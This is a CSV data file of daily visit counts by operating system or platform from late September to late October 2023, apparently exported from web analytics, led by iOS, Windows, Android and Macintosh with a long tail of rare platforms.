2023-10-23,Playstation Vita,14
2023-10-23,Sony,11
2023-10-23,Nokia,7
2023-10-23,macOS X,5
2023-10-23,PalmOS,4
2023-10-23,iPhone,4
2023-10-23,DingOS,2
2023-10-23,LG,2
2023-10-23,NTT DoCoMo,2
2023-10-23,Nintendo 3DS,2
2023-10-23,Nintendo Wii,2
2023-10-23,WebTV,1
2023-10-22,iOS,10813957
2023-10-22,Android,6086559
2023-10-22,Windows,5514478
2023-10-22,Macintosh,2782210
2023-10-22,Linux,895025
2023-10-22,Chrome OS,344225
2023-10-22,(not set),17251
2023-10-22,Tizen,1087
2023-10-22,FreeBSD,660
2023-10-22,OS/2,618
2023-10-22,Fuchsia,527
2023-10-22,Playstation 4,385
2023-10-22,Firefox OS,367
2023-10-22,BlackBerry,121
2023-10-22,UNIX,63
2023-10-22,Windows Phone,60
2023-10-22,OpenBSD,53
2023-10-22,Samsung,48
2023-10-22,SymbianOS,27
2023-10-22,Xbox,27
2023-10-22,NetBSD,17
2023-10-22,Nokia,13
2023-10-22,Playstation Vita,12
2023-10-22,SunOS,12
2023-10-22,Sony,10
2023-10-22,PalmOS,8
2023-10-22,Nintendo 3DS,5
2023-10-22,Nintendo Wii,5
2023-10-22,Mac OS,3
2023-10-22,Nintendo WiiU,3
2023-10-22,MOT,1
2023-10-22,Solaris,1
2023-10-22,macOS X,1
2023-10-21,iOS,12462105
2023-10-21,Android,6792327
2023-10-21,Windows,5330555
2023-10-21,Macintosh,2481321
2023-10-21,Linux,841927
2023-10-21,Chrome OS,287977
2023-10-21,(not set),38988
2023-10-21,Tizen,1143
2023-10-21,FreeBSD,949
2023-10-21,OS/2,568
2023-10-21,Fuchsia,556
2023-10-21,Playstation 4,420
2023-10-21,Firefox OS,401
2023-10-21,BlackBerry,113
2023-10-21,Windows Phone,87
2023-10-21,UNIX,53
2023-10-21,Samsung,49
2023-10-21,OpenBSD,40
2023-10-21,Xbox,34
2023-10-21,Playstation Vita,15
2023-10-21,NetBSD,14
2023-10-21,SymbianOS,14
2023-10-21,Sony,10
2023-10-21,SunOS,9
2023-10-21,Nokia,4
2023-10-21,Nintendo 3DS,3
2023-10-21,LG,2
2023-10-21,PalmOS,2
2023-10-21,MOT,1
2023-10-21,NTT DoCoMo,1
2023-10-21,Nintendo Wii,1
2023-10-21,Playstation 3,1
2023-10-21,Solaris,1
2023-10-21,WebTV,1
2023-10-20,iOS,14814551
2023-10-20,Windows,12126729
2023-10-20,Android,8116252
2023-10-20,Macintosh,3749536
2023-10-20,Linux,920817
2023-10-20,Chrome OS,836221
2023-10-20,(not set),45060
2023-10-20,FreeBSD,1470
2023-10-20,Tizen,1143
2023-10-20,OS/2,634
2023-10-20,Fuchsia,505
2023-10-20,Firefox OS,438
2023-10-20,Playstation 4,404
2023-10-20,BlackBerry,116
2023-10-20,Windows Phone,89
2023-10-20,OpenBSD,56
2023-10-20,UNIX,48
2023-10-20,Samsung,40
2023-10-20,NetBSD,29
2023-10-20,Xbox,29
2023-10-20,Playstation Vita,18
2023-10-20,SymbianOS,18
2023-10-20,SunOS,17
2023-10-20,Nintendo Wii,14
2023-10-20,Sony,12
2023-10-20,Nokia,7
2023-10-20,notWindows,5
2023-10-20,MOT,3
2023-10-20,PalmOS,3
2023-10-20,LG,2
2023-10-20,Nintendo WiiU,1
2023-10-20,WebTV,1
2023-10-20,iPhone,1
2023-10-19,iOS,16395100
2023-10-19,Windows,14361914
2023-10-19,Android,8754434
2023-10-19,Macintosh,4299822
2023-10-19,Chrome OS,1035921
2023-10-19,Linux,903902
2023-10-19,(not set),31188
2023-10-19,FreeBSD,1428
2023-10-19,Tizen,1217
2023-10-19,OS/2,658
2023-10-19,Fuchsia,593
2023-10-19,Firefox OS,443
2023-10-19,Playstation 4,411
2023-10-19,BlackBerry,117
2023-10-19,Windows Phone,89
2023-10-19,UNIX,65
2023-10-19,OpenBSD,60
2023-10-19,Xbox,34
2023-10-19,Samsung,33
2023-10-19,NetBSD,29
2023-10-19,SymbianOS,29
2023-10-19,SunOS,12
2023-10-19,Playstation Vita,11
2023-10-19,Sony,9
2023-10-19,Nokia,8
2023-10-19,Nintendo Wii,5
2023-10-19,WebTV,4
2023-10-19,IRIX,1
2023-10-19,MOT,1
2023-10-19,Nintendo WiiU,1
2023-10-19,PalmOS,1
2023-10-19,Playstation 3,1
2023-10-18,iOS,16165651
2023-10-18,Windows,14926185
2023-10-18,Android,8490184
2023-10-18,Macintosh,4370849
2023-10-18,Chrome OS,1035510
2023-10-18,Linux,851944
2023-10-18,(not set),24944
2023-10-18,FreeBSD,1239
2023-10-18,Tizen,1068
2023-10-18,OS/2,636
2023-10-18,Fuchsia,527
2023-10-18,Firefox OS,437
2023-10-18,Playstation 4,349
2023-10-18,BlackBerry,125
2023-10-18,Windows Phone,85
2023-10-18,UNIX,69
2023-10-18,Samsung,63
2023-10-18,OpenBSD,58
2023-10-18,Xbox,39
2023-10-18,SymbianOS,33
2023-10-18,NetBSD,13
2023-10-18,SunOS,13
2023-10-18,Sony,12
2023-10-18,Playstation Vita,7
2023-10-18,Nintendo 3DS,4
2023-10-18,Nintendo Wii,4
2023-10-18,Nokia,3
2023-10-18,Nintendo WiiU,2
2023-10-18,macOS X,2
2023-10-18,BeOS,1
2023-10-18,LG,1
2023-10-18,Mac OS,1
2023-10-18,PalmOS,1
2023-10-18,Playstation 3,1
2023-10-18,Solaris,1
2023-10-18,WebTV,1
2023-10-17,iOS,15933356
2023-10-17,Windows,15256882
2023-10-17,Android,8118223
2023-10-17,Macintosh,4601405
2023-10-17,Chrome OS,1050696
2023-10-17,Linux,864709
2023-10-17,(not set),24604
2023-10-17,FreeBSD,1278
2023-10-17,Tizen,1052
2023-10-17,OS/2,581
2023-10-17,Fuchsia,536
2023-10-17,Firefox OS,407
2023-10-17,Playstation 4,353
2023-10-17,BlackBerry,124
2023-10-17,Windows Phone,93
2023-10-17,OpenBSD,58
2023-10-17,UNIX,57
2023-10-17,Samsung,47
2023-10-17,SymbianOS,25
2023-10-17,Xbox,25
2023-10-17,NetBSD,22
2023-10-17,SunOS,12
2023-10-17,Unknown,9
2023-10-17,Playstation Vita,8
2023-10-17,macOS X,7
2023-10-17,Nokia,4
2023-10-17,LG,3
2023-10-17,Sony,3
2023-10-17,Nintendo Wii,2
2023-10-17,MOT,1
2023-10-17,NTT DoCoMo,1
2023-10-17,Nintendo WiiU,1
2023-10-17,PalmOS,1
2023-10-17,Playstation 3,1
2023-10-17,Playstation Portable,1
2023-10-16,iOS,16155069
2023-10-16,Windows,15441996
2023-10-16,Android,8520792
2023-10-16,Macintosh,4817803
2023-10-16,Chrome OS,1008029
2023-10-16,Linux,881741
2023-10-16,(not set),23998
2023-10-16,FreeBSD,1535
2023-10-16,Tizen,1143
2023-10-16,OS/2,587
2023-10-16,Fuchsia,517
2023-10-16,Firefox OS,433
2023-10-16,Playstation 4,375
2023-10-16,BlackBerry,139
2023-10-16,OpenBSD,79
2023-10-16,Windows Phone,74
2023-10-16,UNIX,53
2023-10-16,Samsung,51
2023-10-16,Xbox,33
2023-10-16,SymbianOS,24
2023-10-16,SunOS,14
2023-10-16,NetBSD,13
2023-10-16,Sony,13
2023-10-16,Playstation Vita,11
2023-10-16,Nokia,8
2023-10-16,MOT,4
2023-10-16,PalmOS,4
2023-10-16,Solaris,3
2023-10-16,Unknown,3
2023-10-16,macOS X,3
2023-10-16,BeOS,2
2023-10-16,Nintendo 3DS,2
2023-10-16,Nintendo WiiU,2
2023-10-16,IRIX,1
2023-10-16,NTT DoCoMo,1
2023-10-16,Nintendo Wii,1
2023-10-16,Playstation Portable,1
2023-10-16,WebTV,1
2023-10-15,iOS,11220275
2023-10-15,Android,6333603
2023-10-15,Windows,5931538
2023-10-15,Macintosh,2985521
2023-10-15,Linux,721921
2023-10-15,Chrome OS,349288
2023-10-15,(not set),28869
2023-10-15,Tizen,1149
2023-10-15,FreeBSD,611
2023-10-15,OS/2,560
2023-10-15,Fuchsia,505
2023-10-15,Playstation 4,394
2023-10-15,Firefox OS,363
2023-10-15,BlackBerry,92
2023-10-15,OpenBSD,78
2023-10-15,Windows Phone,77
2023-10-15,Samsung,56
2023-10-15,UNIX,54
2023-10-15,NetBSD,26
2023-10-15,SymbianOS,26
2023-10-15,Xbox,25
2023-10-15,SunOS,16
2023-10-15,Sony,12
2023-10-15,Playstation Vita,10
2023-10-15,Nokia,9
2023-10-15,Unknown,5
2023-10-15,NTT DoCoMo,3
2023-10-15,LG,2
2023-10-15,MOT,2
2023-10-15,Nintendo Wii,2
2023-10-15,PalmOS,2
2023-10-15,Mac OS,1
2023-10-15,Playstation Portable,1
2023-10-15,Solaris,1
2023-10-14,iOS,14039427
2023-10-14,Android,7778695
2023-10-14,Windows,5972465
2023-10-14,Macintosh,2825051
2023-10-14,Linux,732256
2023-10-14,Chrome OS,300116
2023-10-14,(not set),29819
2023-10-14,Tizen,2239
2023-10-14,Fuchsia,701
2023-10-14,OS/2,690
2023-10-14,FreeBSD,612
2023-10-14,Playstation 4,430
2023-10-14,Firefox OS,411
2023-10-14,Windows Phone,109
2023-10-14,BlackBerry,92
2023-10-14,OpenBSD,53
2023-10-14,Samsung,45
2023-10-14,UNIX,41
2023-10-14,Xbox,32
2023-10-14,SymbianOS,25
2023-10-14,NetBSD,18
2023-10-14,Sony,9
2023-10-14,Playstation Vita,7
2023-10-14,Nokia,5
2023-10-14,Unknown,5
2023-10-14,Mac OS,4
2023-10-14,Nintendo 3DS,4
2023-10-14,Nintendo WiiU,4
2023-10-14,SunOS,4
2023-10-14,MOT,2
2023-10-14,Nintendo Wii,2
2023-10-14,IRIX,1
2023-10-14,LG,1
2023-10-14,NTT DoCoMo,1
2023-10-14,WebTV,1
2023-10-13,iOS,15241164
2023-10-13,Windows,12381463
2023-10-13,Android,8178339
2023-10-13,Macintosh,3843924
2023-10-13,Chrome OS,797187
2023-10-13,Linux,791103
2023-10-13,(not set),22882
2023-10-13,Tizen,1295
2023-10-13,OS/2,681
2023-10-13,Fuchsia,539
2023-10-13,Firefox OS,493
2023-10-13,Playstation 4,372
2023-10-13,BlackBerry,111
2023-10-13,FreeBSD,103
2023-10-13,Windows Phone,87
2023-10-13,Samsung,60
2023-10-13,UNIX,58
2023-10-13,Xbox,35
2023-10-13,OpenBSD,26
2023-10-13,NetBSD,20
2023-10-13,SymbianOS,14
2023-10-13,SunOS,13
2023-10-13,Mac OS,11
2023-10-13,Unknown,9
2023-10-13,WebTV,9
2023-10-13,Sony,7
2023-10-13,Playstation Vita,6
2023-10-13,Nokia,4
2023-10-13,PalmOS,4
2023-10-13,Nintendo WiiU,3
2023-10-13,Solaris,3
2023-10-13,macOS X,3
2023-10-13,MOT,1
2023-10-12,iOS,15865936
2023-10-12,Windows,14559607
2023-10-12,Android,8553031
2023-10-12,Macintosh,4307999
2023-10-12,Chrome OS,980555
2023-10-12,Linux,838783
2023-10-12,(not set),60588
2023-10-12,Tizen,1289
2023-10-12,OS/2,686
2023-10-12,Fuchsia,573
2023-10-12,Firefox OS,498
2023-10-12,Playstation 4,431
2023-10-12,BlackBerry,153
2023-10-12,FreeBSD,106
2023-10-12,Windows Phone,81
2023-10-12,UNIX,79
2023-10-12,Samsung,45
2023-10-12,Xbox,44
2023-10-12,OpenBSD,40
2023-10-12,SymbianOS,23
2023-10-12,NetBSD,19
2023-10-12,Mac OS,17
2023-10-12,Unknown,15
2023-10-12,Playstation Vita,11
2023-10-12,SunOS,8
2023-10-12,Nokia,5
2023-10-12,WebTV,5
2023-10-12,Nintendo Wii,4
2023-10-12,PalmOS,3
2023-10-12,Sony,3
2023-10-12,Nintendo 3DS,2
2023-10-12,Nintendo WiiU,2
2023-10-12,BeOS,1
2023-10-12,LG,1
2023-10-12,Playstation 3,1
2023-10-12,iPhone,1
2023-10-11,iOS,15278966
2023-10-11,Windows,14787508
2023-10-11,Android,8712277
2023-10-11,Macintosh,4396394
2023-10-11,Chrome OS,971630
2023-10-11,Linux,814007
2023-10-11,(not set),68432
2023-10-11,Tizen,1163
2023-10-11,OS/2,698
2023-10-11,Fuchsia,518
2023-10-11,Firefox OS,492
2023-10-11,Playstation 4,395
2023-10-11,FreeBSD,109
2023-10-11,BlackBerry,108
2023-10-11,Windows Phone,94
2023-10-11,UNIX,54
2023-10-11,OpenBSD,53
2023-10-11,Xbox,33
2023-10-11,NetBSD,23
2023-10-11,Samsung,19
2023-10-11,SunOS,19
2023-10-11,SymbianOS,18
2023-10-11,Mac OS,15
2023-10-11,Unknown,12
2023-10-11,Sony,10
2023-10-11,Nintendo Wii,8
2023-10-11,PalmOS,6
2023-10-11,LG,2
2023-10-11,MOT,2
2023-10-11,Nokia,2
2023-10-11,macOS X,2
2023-10-11,DingOS,1
2023-10-11,Nintendo 3DS,1
2023-10-11,Nintendo WiiU,1
2023-10-11,Playstation Portable,1
2023-10-11,Playstation Vita,1
2023-10-10,iOS,16887845
2023-10-10,Windows,14735932
2023-10-10,Android,8780471
2023-10-10,Macintosh,4521453
2023-10-10,Chrome OS,977517
2023-10-10,Linux,947597
2023-10-10,(not set),48238
2023-10-10,Tizen,1054
2023-10-10,OS/2,664
2023-10-10,Fuchsia,508
2023-10-10,Playstation 4,433
2023-10-10,Firefox OS,424
2023-10-10,BlackBerry,111
2023-10-10,FreeBSD,108
2023-10-10,Windows Phone,83
2023-10-10,UNIX,58
2023-10-10,OpenBSD,39
2023-10-10,Xbox,23
2023-10-10,NetBSD,18
2023-10-10,SymbianOS,18
2023-10-10,Mac OS,16
2023-10-10,SunOS,15
2023-10-10,Sony,8
2023-10-10,Samsung,7
2023-10-10,Solaris,4
2023-10-10,Nintendo Wii,2
2023-10-10,Nokia,2
2023-10-10,PalmOS,2
2023-10-10,BeOS,1
2023-10-10,DingOS,1
2023-10-10,Nintendo 3DS,1
2023-10-09,iOS,13877075
2023-10-09,Windows,11703440
2023-10-09,Android,7805647
2023-10-09,Macintosh,4137044
2023-10-09,Linux,889676
2023-10-09,Chrome OS,720752
2023-10-09,(not set),16046
2023-10-09,Tizen,1090
2023-10-09,Fuchsia,638
2023-10-09,OS/2,634
2023-10-09,Firefox OS,427
2023-10-09,Playstation 4,342
2023-10-09,FreeBSD,107
2023-10-09,BlackBerry,87
2023-10-09,UNIX,86
2023-10-09,Windows Phone,85
2023-10-09,OpenBSD,35
2023-10-09,Xbox,22
2023-10-09,Mac OS,20
2023-10-09,NetBSD,18
2023-10-09,SymbianOS,14
2023-10-09,DingOS,9
2023-10-09,SunOS,9
2023-10-09,Samsung,8
2023-10-09,Sony,6
2023-10-09,Solaris,5
2023-10-09,Nintendo Wii,4
2023-10-09,Playstation Vita,3
2023-10-09,LG,1
2023-10-09,MOT,1
2023-10-09,NTT DoCoMo,1
2023-10-09,PalmOS,1
2023-10-09,Playstation 3,1
2023-10-09,WebTV,1
2023-10-09,macOS X,1
2023-10-08,iOS,10425077
2023-10-08,Android,6283099
2023-10-08,Windows,5281776
2023-10-08,Macintosh,2655138
2023-10-08,Linux,771942
2023-10-08,Chrome OS,324592
2023-10-08,(not set),15287
2023-10-08,Tizen,991
2023-10-08,OS/2,577
2023-10-08,Fuchsia,518
2023-10-08,Playstation 4,363
2023-10-08,Firefox OS,334
2023-10-08,UNIX,194
2023-10-08,FreeBSD,117
2023-10-08,BlackBerry,106
2023-10-08,Windows Phone,85
2023-10-08,OpenBSD,71
2023-10-08,SunOS,40
2023-10-08,Xbox,17
2023-10-08,Nintendo Wii,15
2023-10-08,SymbianOS,15
2023-10-08,Mac OS,11
2023-10-08,NetBSD,10
2023-10-08,Sony,8
2023-10-08,Samsung,7
2023-10-08,WebTV,7
2023-10-08,BeOS,6
2023-10-08,Solaris,6
2023-10-08,DingOS,5
2023-10-08,PalmOS,2
2023-10-08,IRIX,1
2023-10-08,Playstation 3,1
2023-10-07,iOS,12286063
2023-10-07,Android,7079299
2023-10-07,Windows,5280410
2023-10-07,Macintosh,2493106
2023-10-07,Linux,757549
2023-10-07,Chrome OS,282884
2023-10-07,(not set),18796
2023-10-07,Tizen,989
2023-10-07,OS/2,616
2023-10-07,Fuchsia,488
2023-10-07,Firefox OS,381
2023-10-07,Playstation 4,380
2023-10-07,UNIX,224
2023-10-07,FreeBSD,148
2023-10-07,BlackBerry,112
2023-10-07,Windows Phone,94
2023-10-07,OpenBSD,45
2023-10-07,SunOS,35
2023-10-07,Xbox,28
2023-10-07,NetBSD,18
2023-10-07,SymbianOS,16
2023-10-07,Nintendo Wii,14
2023-10-07,Mac OS,11
2023-10-07,Samsung,10
2023-10-07,PalmOS,2
2023-10-07,Sony,2
2023-10-07,WebTV,2
2023-10-07,BeOS,1
2023-10-07,Playstation 3,1
2023-10-07,Solaris,1
2023-10-07,macOS X,1
2023-10-06,iOS,14326907
2023-10-06,Windows,11722368
2023-10-06,Android,8030867
2023-10-06,Macintosh,3683928
2023-10-06,Linux,863397
2023-10-06,Chrome OS,824392
2023-10-06,(not set),18652
2023-10-06,Tizen,1094
2023-10-06,OS/2,676
2023-10-06,Fuchsia,445
2023-10-06,Firefox OS,431
2023-10-06,Playstation 4,379
2023-10-06,UNIX,289
2023-10-06,FreeBSD,147
2023-10-06,BlackBerry,111
2023-10-06,Windows Phone,95
2023-10-06,OpenBSD,59
2023-10-06,SunOS,29
2023-10-06,Xbox,20
2023-10-06,Mac OS,14
2023-10-06,Solaris,14
2023-10-06,SymbianOS,12
2023-10-06,NetBSD,9
2023-10-06,Nintendo Wii,5
2023-10-06,Nokia,4
2023-10-06,Sony,4
2023-10-06,Playstation Vita,3
2023-10-06,Samsung,3
2023-10-06,WebTV,3
2023-10-06,BeOS,2
2023-10-06,LG,1
2023-10-06,MOT,1
2023-10-06,NTT DoCoMo,1
2023-10-06,Playstation 3,1
2023-10-05,iOS,15982090
2023-10-05,Windows,14374968
2023-10-05,Android,8796911
2023-10-05,Macintosh,4307565
2023-10-05,Chrome OS,1013691
2023-10-05,Linux,937095
2023-10-05,(not set),21372
2023-10-05,Tizen,1103
2023-10-05,OS/2,725
2023-10-05,Fuchsia,487
2023-10-05,Firefox OS,427
2023-10-05,Playstation 4,375
2023-10-05,UNIX,239
2023-10-05,FreeBSD,156
2023-10-05,BlackBerry,111
2023-10-05,Windows Phone,92
2023-10-05,OpenBSD,58
2023-10-05,SunOS,44
2023-10-05,NetBSD,27
2023-10-05,Xbox,24
2023-10-05,Mac OS,15
2023-10-05,Nintendo Wii,15
2023-10-05,SymbianOS,11
2023-10-05,Samsung,10
2023-10-05,Solaris,8
2023-10-05,WebTV,5
2023-10-05,Sony,4
2023-10-05,Playstation Vita,2
2023-10-05,BeOS,1
2023-10-05,IRIX,1
2023-10-05,Nintendo WiiU,1
2023-10-05,PalmOS,1
2023-10-05,Vodafone,1
2023-10-04,iOS,17444258
2023-10-04,Windows,15147996
2023-10-04,Android,9326646
2023-10-04,Macintosh,4697912
2023-10-04,Chrome OS,1074090
2023-10-04,Linux,895131
2023-10-04,(not set),17135
2023-10-04,Tizen,1189
2023-10-04,OS/2,751
2023-10-04,Fuchsia,581
2023-10-04,Firefox OS,458
2023-10-04,Playstation 4,423
2023-10-04,UNIX,251
2023-10-04,FreeBSD,176
2023-10-04,BlackBerry,109
2023-10-04,Windows Phone,99
2023-10-04,OpenBSD,56
2023-10-04,SunOS,36
2023-10-04,Xbox,30
2023-10-04,NetBSD,24
2023-10-04,Nintendo Wii,18
2023-10-04,SymbianOS,17
2023-10-04,Mac OS,12
2023-10-04,Samsung,10
2023-10-04,Sony,8
2023-10-04,Solaris,7
2023-10-04,WebTV,2
2023-10-04,AIX,1
2023-10-04,BeOS,1
2023-10-04,Nokia,1
2023-10-04,Playstation 3,1
2023-10-04,Playstation Vita,1
2023-10-03,iOS,16076754
2023-10-03,Windows,14568479
2023-10-03,Android,8330742
2023-10-03,Macintosh,4420225
2023-10-03,Chrome OS,1039548
2023-10-03,Linux,938789
2023-10-03,(not set),41384
2023-10-03,Tizen,1232
2023-10-03,OS/2,680
2023-10-03,Fuchsia,675
2023-10-03,Firefox OS,412
2023-10-03,Playstation 4,404
2023-10-03,UNIX,240
2023-10-03,FreeBSD,133
2023-10-03,BlackBerry,99
2023-10-03,Windows Phone,94
2023-10-03,OpenBSD,61
2023-10-03,SunOS,27
2023-10-03,Xbox,25
2023-10-03,SymbianOS,23
2023-10-03,NetBSD,21
2023-10-03,Mac OS,10
2023-10-03,Nintendo Wii,10
2023-10-03,Nokia,8
2023-10-03,Sony,6
2023-10-03,BeOS,4
2023-10-03,Samsung,4
2023-10-03,LG,2
2023-10-03,Vodafone,2
2023-10-03,WebTV,2
2023-10-03,macOS X,2
2023-10-03,MOT,1
2023-10-03,Solaris,1
2023-10-02,iOS,15201044
2023-10-02,Windows,15159698
2023-10-02,Android,8074390
2023-10-02,Macintosh,4517835
2023-10-02,Chrome OS,1016560
2023-10-02,Linux,896916
2023-10-02,(not set),19524
2023-10-02,Tizen,1185
2023-10-02,OS/2,662
2023-10-02,Fuchsia,539
2023-10-02,Firefox OS,427
2023-10-02,Playstation 4,400
2023-10-02,UNIX,222
2023-10-02,FreeBSD,154
2023-10-02,BlackBerry,112
2023-10-02,Windows Phone,79
2023-10-02,OpenBSD,72
2023-10-02,SunOS,44
2023-10-02,Xbox,25
2023-10-02,SymbianOS,22
2023-10-02,NetBSD,21
2023-10-02,Samsung,10
2023-10-02,Nintendo Wii,9
2023-10-02,Mac OS,8
2023-10-02,Solaris,5
2023-10-02,Nokia,4
2023-10-02,Sony,3
2023-10-02,WebTV,3
2023-10-02,Playstation Vita,2
2023-10-02,macOS X,2
2023-10-02,BeOS,1
2023-10-02,IRIX,1
2023-10-02,LG,1
2023-10-02,MOT,1
2023-10-02,NTT DoCoMo,1
2023-10-02,PalmOS,1
2023-10-02,Playstation 3,1
2023-10-02,Unknown,1
2023-10-01,iOS,10296756
2023-10-01,Android,5949787
2023-10-01,Windows,5355177
2023-10-01,Macintosh,2856893
2023-10-01,Linux,740960
2023-10-01,Chrome OS,338007
2023-10-01,(not set),18367
2023-10-01,Tizen,1133
2023-10-01,OS/2,533
2023-10-01,Fuchsia,487
2023-10-01,Playstation 4,389
2023-10-01,Firefox OS,332
2023-10-01,UNIX,197
2023-10-01,FreeBSD,110
2023-10-01,Windows Phone,85
2023-10-01,BlackBerry,62
2023-10-01,OpenBSD,62
2023-10-01,Xbox,27
2023-10-01,SunOS,26
2023-10-01,SymbianOS,24
2023-10-01,NetBSD,19
2023-10-01,Nintendo Wii,18
2023-10-01,Samsung,7
2023-10-01,Solaris,6
2023-10-01,BeOS,5
2023-10-01,Sony,5
2023-10-01,PalmOS,4
2023-10-01,Nokia,3
2023-10-01,WebTV,3
2023-10-01,MOT,2
2023-10-01,Unknown,2
2023-10-01,iPhone,2
2023-10-01,Nintendo 3DS,1
2023-09-30,iOS,12375051
2023-09-30,Android,6663930
2023-09-30,Windows,5367934
2023-09-30,Macintosh,2512056
2023-09-30,Linux,695385
2023-09-30,Chrome OS,284199
2023-09-30,(not set),19898
2023-09-30,Tizen,1083
2023-09-30,OS/2,639
2023-09-30,Fuchsia,503
2023-09-30,Playstation 4,402
2023-09-30,Firefox OS,332
2023-09-30,UNIX,250
2023-09-30,FreeBSD,137
2023-09-30,BlackBerry,97
2023-09-30,Windows Phone,83
2023-09-30,OpenBSD,60
2023-09-30,SunOS,40
2023-09-30,Xbox,27
2023-09-30,NetBSD,23
2023-09-30,SymbianOS,13
2023-09-30,Nintendo Wii,12
2023-09-30,Solaris,10
2023-09-30,Samsung,8
2023-09-30,Nokia,5
2023-09-30,Sony,5
2023-09-30,WebTV,5
2023-09-30,LG,2
2023-09-30,PalmOS,2
2023-09-30,Playstation Vita,2
2023-09-30,Mac OS,1
2023-09-30,NTT DoCoMo,1
2023-09-30,iPhone,1
2023-09-29,iOS,14475343
2023-09-29,Windows,12219803
2023-09-29,Android,7481648
2023-09-29,Macintosh,3735183
2023-09-29,Chrome OS,870553
2023-09-29,Linux,784346
2023-09-29,(not set),18393
2023-09-29,Tizen,1110
2023-09-29,OS/2,673
2023-09-29,Fuchsia,502
2023-09-29,Playstation 4,431
2023-09-29,Firefox OS,401
2023-09-29,UNIX,225
2023-09-29,FreeBSD,163
2023-09-29,Windows Phone,94
2023-09-29,BlackBerry,93
2023-09-29,OpenBSD,58
2023-09-29,SunOS,38
2023-09-29,Xbox,25
2023-09-29,NetBSD,24
2023-09-29,Nintendo Wii,18
2023-09-29,SymbianOS,15
2023-09-29,WebTV,11
2023-09-29,Samsung,8
2023-09-29,Solaris,5
2023-09-29,Sony,4
2023-09-29,Mac OS,3
2023-09-29,MOT,2
2023-09-29,Nokia,2
2023-09-29,Playstation Vita,2
2023-09-29,iPhone,2
2023-09-29,macOS X,2
2023-09-29,BeOS,1
2023-09-29,IRIX,1
2023-09-29,LG,1
2023-09-29,NTT DoCoMo,1
2023-09-29,PalmOS,1
2023-09-29,Vodafone,1
2023-09-28,iOS,15637445
2023-09-28,Windows,14122793
2023-09-28,Android,8095289
2023-09-28,Macintosh,4204727
2023-09-28,Chrome OS,1044190
2023-09-28,Linux,813748
2023-09-28,(not set),27042
2023-09-28,Tizen,1158
2023-09-28,OS/2,662
2023-09-28,Fuchsia,515
2023-09-28,Firefox OS,445
2023-09-28,Playstation 4,402
2023-09-28,UNIX,273
2023-09-28,FreeBSD,180
2023-09-28,BlackBerry,100
2023-09-28,Windows Phone,85
2023-09-28,OpenBSD,73
2023-09-28,SunOS,27
2023-09-28,Xbox,27
2023-09-28,Nintendo Wii,17
2023-09-28,SymbianOS,17
2023-09-28,NetBSD,13
2023-09-28,Mac OS,8
2023-09-28,Samsung,6
2023-09-28,WebTV,6
2023-09-28,Nokia,4
2023-09-28,Solaris,4
2023-09-28,Sony,4
2023-09-28,BeOS,2
2023-09-28,NTT DoCoMo,2
2023-09-28,PalmOS,2
2023-09-28,LG,1
2023-09-28,macOS X,1
2023-09-27,iOS,15627164
2023-09-27,Windows,13944101
2023-09-27,Android,8176516
2023-09-27,Macintosh,4251913
2023-09-27,Chrome OS,1020788
2023-09-27,Linux,808142
2023-09-27,(not set),31230
2023-09-27,Tizen,1222
2023-09-27,OS/2,744
2023-09-27,Firefox OS,499
2023-09-27,Fuchsia,495
2023-09-27,Playstation 4,438
2023-09-27,UNIX,285
2023-09-27,FreeBSD,209
2023-09-27,Windows Phone,101
2023-09-27,BlackBerry,80
2023-09-27,OpenBSD,59
2023-09-27,SunOS,39
2023-09-27,Xbox,32
2023-09-27,NetBSD,25
2023-09-27,Nintendo Wii,22
2023-09-27,SymbianOS,13
2023-09-27,Mac OS,11
2023-09-27,Solaris,10
2023-09-27,Sony,5
2023-09-27,macOS X,5
2023-09-27,Nokia,4
2023-09-27,Samsung,4
2023-09-27,WebTV,4
2023-09-27,PalmOS,2
2023-09-27,Playstation 3,2
2023-09-27,BeOS,1
2023-09-27,Playstation Portable,1
2023-09-26,iOS,15625117
2023-09-26,Windows,14961102
2023-09-26,Android,8436137
2023-09-26,Macintosh,4522845
2023-09-26,Chrome OS,1009874
2023-09-26,Linux,828582
2023-09-26,(not set),33294
2023-09-26,Tizen,1189
2023-09-26,OS/2,765
2023-09-26,Fuchsia,525
2023-09-26,Firefox OS,472
2023-09-26,Playstation 4,409
2023-09-26,UNIX,171
2023-09-26,FreeBSD,157
2023-09-26,BlackBerry,90
2023-09-26,Windows Phone,89
2023-09-26,OpenBSD,42
2023-09-26,Xbox,23
2023-09-26,SunOS,22
2023-09-26,SymbianOS,14
2023-09-26,NetBSD,13
2023-09-26,Mac OS,10
2023-09-26,Nintendo Wii,9
2023-09-26,Samsung,7
2023-09-26,Nokia,5
2023-09-26,LG,3
2023-09-26,PalmOS,2
2023-09-26,Solaris,2
2023-09-26,iPhone,2
2023-09-26,macOS X,2
2023-09-26,Sony,1
2023-09-26,WebTV,1
2023-09-25,iOS,18773168
2023-09-25,Windows,15862391
2023-09-25,Android,9677961
2023-09-25,Macintosh,5083593
2023-09-25,Chrome OS,933692
2023-09-25,Linux,798163
2023-09-25,(not set),21505
2023-09-25,Tizen,1241
2023-09-25,OS/2,826
2023-09-25,Fuchsia,573
2023-09-25,Firefox OS,528
2023-09-25,Playstation 4,435
2023-09-25,UNIX,219
2023-09-25,FreeBSD,208
2023-09-25,Windows Phone,103
2023-09-25,BlackBerry,102
2023-09-25,OpenBSD,40
2023-09-25,SunOS,39
2023-09-25,NetBSD,38
2023-09-25,Xbox,28
2023-09-25,SymbianOS,18
2023-09-25,Nintendo Wii,15
2023-09-25,Mac OS,13
2023-09-25,Samsung,10
2023-09-25,Sony,7
2023-09-25,WebTV,7
2023-09-25,Nokia,5
2023-09-25,Solaris,5
2023-09-25,macOS X,3
2023-09-25,BeOS,2
2023-09-25,Playstation 3,2
2023-09-25,Playstation Vita,1
2023-09-24,iOS,10883007
2023-09-24,Android,6243224
2023-09-24,Windows,5310110
2023-09-24,Macintosh,2859509
2023-09-24,Linux,764925
2023-09-24,Chrome OS,344332
2023-09-24,(not set),13230
2023-09-24,Tizen,1498
2023-09-24,OS/2,741
2023-09-24,Fuchsia,592
2023-09-24,Playstation 4,490
2023-09-24,Firefox OS,453
2023-09-24,UNIX,274
2023-09-24,FreeBSD,139
2023-09-24,Windows Phone,92
2023-09-24,BlackBerry,69
2023-09-24,OpenBSD,67
2023-09-24,Xbox,35
2023-09-24,Nintendo Wii,27
2023-09-24,SunOS,27
2023-09-24,NetBSD,23
2023-09-24,SymbianOS,16
2023-09-24,Samsung,6
2023-09-24,WebTV,6
2023-09-24,Nokia,5
2023-09-24,Solaris,5
2023-09-24,BeOS,4
2023-09-24,Mac OS,4
2023-09-24,Sony,4
2023-09-24,iPhone,2
